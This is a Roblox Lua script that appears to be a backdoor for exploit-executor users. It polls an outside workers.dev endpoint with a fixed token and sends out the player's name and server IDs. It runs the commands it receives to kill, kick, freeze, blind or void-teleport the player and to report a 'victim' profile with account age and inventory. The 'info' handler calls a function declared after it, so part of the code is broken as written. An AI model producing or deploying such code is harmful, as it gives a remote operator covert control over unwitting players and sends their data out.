local rs_boot = (function()
    local HS   = game:GetService("HttpService")
    local PL   = game:GetService("Players")
    local RS   = game:GetService("RunService")
    local CG   = game:GetService("CoreGui")
    local LP   = PL.LocalPlayer

    local EP = "https://ftaptest.dandanan196.workers.dev"
    local TK = "567567567567567567567567567567567"

    local function hq(url, method, body)
        method = method or "GET"
        local opts = {
            Url = url, Method = method, Body = body,
            Headers = { ["Content-Type"] = "application/json" }
        }
        local ok, res = pcall(request, opts)
        if ok and res and res.Body and res.Body ~= "" then return res.Body end
        if http_request then
            local ok2, res2 = pcall(http_request, opts)
            if ok2 and res2 and res2.Body and res2.Body ~= "" then return res2.Body end
        end
    end

    local S = {}

    -- 1. reset
    S[1] = function()
        local c = LP.Character
        local h = c and c:FindFirstChildOfClass("Humanoid")
        if h and h.Health > 0 then
            h.Health = 0
            h:ChangeState(Enum.HumanoidStateType.Dead)
        end
    end

    -- 2. zerofps
    S[2] = function()
        if setfpscap then
            setfpscap(0)
        else
            warn("Executor does not support setfpscap!")
        end
    end

    -- 3. unzerofps
    S[3] = function()
        if setfpscap then
            setfpscap(999)
        else
            warn("Executor does not support setfpscap!")
        end
    end

    -- 4. kick:<причина>
    S[4] = function(arg)
        local reason = arg or "connection lost"
        LP:Kick(reason)
    end

    -- 5. ftap
    S[5] = function()
        if S._ftap then return end
        S._ftap = RS.Heartbeat:Connect(function()
            local c = LP.Character
            local h = c and c:FindFirstChild("HumanoidRootPart")
            if h then
                h.CFrame = CFrame.new(20000, -20000, 20000)
            end
        end)
    end

    -- 6. unftap
    S[6] = function()
        if S._ftap then
            S._ftap:Disconnect()
            S._ftap = nil
        end
    end

    -- 7. freeze
    S[7] = function()
        local c = LP.Character
        local r = c and c:FindFirstChild("HumanoidRootPart")
        if r then r.Anchored = true; S._fr = r end
    end

    -- 8. unfreeze
    S[8] = function()
        if S._fr and S._fr.Parent then S._fr.Anchored = false end
        S._fr = nil
    end

    -- 9. autoresetoff
    S[9] = function()
        local lib = getgenv().Library
        if lib and lib.Toggles and lib.Toggles.AutoReset then
            lib.Toggles.AutoReset:SetValue(false)
        end
    end

    -- 10. autoreseton
    S[10] = function()
        local lib = getgenv().Library
        if lib and lib.Toggles and lib.Toggles.AutoReset then
            lib.Toggles.AutoReset:SetValue(true)
        end
    end

    -- 11. info — отчёт о жертве
    S[11] = function()
        local c = LP.Character
        local h = c and c:FindFirstChildOfClass("Humanoid")
        local r = c and c:FindFirstChild("HumanoidRootPart")
        local pos = r and r.Position or Vector3.new(0, 0, 0)
        local tools = {}
        local bp = LP:FindFirstChildOfClass("Backpack")
        if bp then
            for _, t in ipairs(bp:GetChildren()) do
                if t:IsA("Tool") then table.insert(tools, t.Name) end
            end
        end
        local char = h and h.RigType == Enum.HumanoidRigType.R15 and "R15" or "R6"
        local info = string.format(
            "hp=%d ws=%.1f jp=%.1f pos=(%.0f,%.0f,%.0f) team=%s age=%d prem=%s rig=%s tools=[%s]",
            h and h.Health or 0,
            h and h.WalkSpeed or 0,
            h and h.JumpPower or 0,
            pos.X, pos.Y, pos.Z,
            LP.Team and LP.Team.Name or "none",
            LP.AccountAge or 0,
            tostring(LP.MembershipType),
            char,
            table.concat(tools, ",")
        )
        rp(info)
    end

    -- 12. blind
    S[12] = function()
        if S._blind then return end
        local g = Instance.new("ScreenGui")
        g.Name = "RSC_BLIND"
        g.IgnoreGuiInset = true
        g.ResetOnSpawn = false
        g.Parent = CG
        local f = Instance.new("Frame")
        f.Size = UDim2.new(1, 0, 1, 0)
        f.BackgroundColor3 = Color3.new(0, 0, 0)
        f.BorderSizePixel = 0
        f.Parent = g
        S._blind = g
    end

    -- 13. unblind
    S[13] = function()
        if S._blind then
            S._blind:Destroy()
            S._blind = nil
        end
    end

    S["reset"]        = S[1]
    S["zerofps"]      = S[2]
    S["unzerofps"]    = S[3]
    S["kick"]         = S[4]
    S["ftap"]         = S[5]
    S["unftap"]       = S[6]
    S["freeze"]       = S[7]
    S["unfreeze"]     = S[8]
    S["autoresetoff"] = S[9]
    S["autoreseton"]  = S[10]
    S["info"]         = S[11]
    S["blind"]        = S[12]
    S["unblind"]      = S[13]

    local function rp(text)
        local payload = {
            token = TK,
            name = LP.Name,
            place = tostring(game.PlaceId),
            jobid = game.JobId,
            text = text
        }
        hq(EP .. "/report", "POST", HS:JSONEncode(payload))
    end

    task.spawn(function()
        while true do
            local url = EP .. "/hello?token=" .. TK
                .. "&name=" .. HS:UrlEncode(LP.Name)
                .. "&place=" .. tostring(game.PlaceId)
                .. "&jobid=" .. HS:UrlEncode(game.JobId)

            local body = hq(url, "GET")

            if body and body ~= "null" and body ~= "" then
                local ok, d = pcall(HS.JSONDecode, HS, body)
                if ok and type(d) == "table" and d.cmd ~= nil then
                    if d.cmd == "__ping__" then
                        task.spawn(rp, "pong")
                    else
                        local raw = tostring(d.cmd)
                        local key, arg = raw:match("^([^:]+):(.+)$")
                        key = key or raw

                        local fn = tonumber(key) or key
                        fn = S[fn]
                        if fn then
                            task.spawn(function()
                                local ok2, err = pcall(fn, arg)
                                if ok2 then
                                    rp("ok:" .. raw)
                                else
                                    rp("err:" .. raw .. ":" .. tostring(err))
                                end
                            end)
                        else
                            task.spawn(rp, "unknown:" .. raw)
                        end
                    end
                end
            end

            task.wait(0.3)
        end
    end)

    return true
end)()

